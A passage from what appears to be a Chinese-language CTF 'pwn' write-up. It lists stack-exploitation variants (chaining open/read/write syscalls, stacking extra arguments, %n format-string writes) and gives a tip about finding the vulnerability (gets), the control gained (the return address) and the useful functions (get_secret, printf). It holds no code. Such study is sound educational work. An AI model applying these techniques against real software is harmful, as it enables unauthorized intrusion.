| 没有现成读取函数 | 拼 `open` / `read` / `write` 系统调用链 |
| 参数更多的函数 | 继续往栈上摆，注意返回地址和参数的相对位置 |
| 格式化字符串 | 用 `%n` 写内存，配合任意地址读写 |

{% note success %}
**一条经验**：pwn 题先问三个问题——**漏洞在哪、能控制什么、程序里已经有什么**。这道题的答案分别是 `gets`、返回地址、`get_secret` + `printf`。把这三个答案拼起来，payload 自然就出来了。工具只是手，栈图才是关键。
{% endnote %}
